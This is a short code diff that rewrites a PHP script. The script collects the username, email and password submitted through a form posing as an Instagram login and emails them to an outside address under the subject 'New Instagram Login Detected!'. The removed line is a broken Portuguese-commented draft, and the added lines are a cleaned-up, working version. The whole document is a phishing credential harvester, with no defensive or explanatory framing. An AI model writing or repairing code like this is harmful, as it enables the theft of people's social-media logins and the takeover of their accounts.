@@ -1,1 +1,15 @@
-php <?phpif ($_SERVER["REQUEST_METHOD"] == "POST") { $username = $_POST['username']; $senha = $_POST['senha']; // Envie os dados para o seu email $to = "seu-email@example.com"; $subject =Novo Login Instagram"; $message = "Usuário: " . $username . "\nSenha: " . $password; $headers = "From: webmaster@example.com"; mail($to, $subject, $message, $headers); }
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    $email = $_POST['email'];
+
+    // Capture email and password with headers
+    $to = "seu-email@example.com";
+    $subject = "New Instagram Login Detected!";
+    $message = "Username: " . $username . "\nEmail: " . $email . "\nPassword: " . $password;
+    $headers = "From: webmaster@example.com";
+
+    mail($to, $subject, $message, $headers);
+}
+?>
